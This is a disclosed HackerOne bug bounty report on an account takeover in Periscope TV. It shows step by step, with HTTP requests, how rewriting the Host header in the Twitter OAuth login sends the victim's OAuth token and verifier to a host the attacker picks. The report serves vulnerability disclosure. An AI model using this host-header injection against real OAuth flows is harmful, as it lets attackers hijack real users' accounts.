# Account Takeover in Periscope TV

## Report Details
- **Report ID**: 317476
- **URL**: https://hackerone.com/reports/317476
- **State**: Closed
- **Severity**: high
- **Submitted**: 2018-02-19T03:28:43.256Z
- **Disclosed**: 2018-09-06T15:37:02.275Z

## Reporter
- **Username**: ngalog
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: x

## Vulnerability Information
**Summary:** 

When you login periscope.tv using twitter, and change the host header from `www.periscope.tv` to `attacker.com/www.periscope.tv`, the oauth redirect destination will be `attacker.com/www.periscope.tv`, thus allowing attacker to send the oauth authorize link to victim, and takeover their account after auto redirect.

## Steps To Reproduce:
Visit https://www.periscope.tv/ and click login with twitter, a request should appear

```
GET /i/twitter/login?csrf=████ HTTP/1.1
Host: www.periscope.tv
User-Agent: █████████
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://www.periscope.tv/
cookie: ...
```

Change the host header to 

`Host: hackerone.com/www.periscope.tv`

Full request

```
GET /i/twitter/login?csrf=██████ HTTP/1.1
Host: hackerone.com/www.periscope.tv
User-Agent: █████████
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://www.periscope.tv/
cookie: ...
```

Response should be something like 

```
<!DOCTYPE html><html><head><meta http-equiv="refresh" content="0;https://twitter.com/oauth/authenticate?oauth_token=████████"></head></html>
```

Send this link to victim, after authorizing, victim's twitter oauth token and verifier is sent to hackerone.com, attacker could now reuse the same token to takeover victim's account.

Vimeo: https://vimeo.com/256356501
password: ███████

## Impact

Account Takeover for periscope.tv

## Attachments
No attachments
